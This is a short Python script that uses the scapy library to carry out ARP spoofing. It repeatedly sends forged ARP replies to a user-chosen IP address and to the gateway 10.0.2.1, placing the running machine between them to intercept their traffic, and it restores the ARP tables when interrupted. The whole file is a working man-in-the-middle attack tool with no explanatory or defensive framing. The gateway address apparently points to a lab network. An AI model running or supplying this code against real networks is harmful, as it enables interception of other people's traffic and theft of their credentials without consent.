import scapy.all as scapy
import time


def scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_request
    answered = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
    for i in range(4):
        answered = scapy.srp(arp_req_broad, timeout=1, verbose=False)[0]
        if answered:
            return answered[0][1].hwsrc
    return ""


def spoof(target_ip, spoof_ip):
    target_mac = scan(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(dest, source):
    dest_mac= scan(dest)
    source_mac = scan(source)
    packet = scapy.ARP(op=2, pdst=dest, hwdst=dest_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)



spf_ip=input("Enter an IP address that you want to Spoof :")
try:
    packets = 0
    while True:
        spoof(spf_ip, "10.0.2.1")
        spoof("10.0.2.1", spf_ip)
        packets = packets + 2
        print("\r[+] Packets sent : " + str(packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRl + C...... QUITTING")
    restore(spf_ip, "10.0.2.1")
    restore("10.0.2.1", spf_ip)
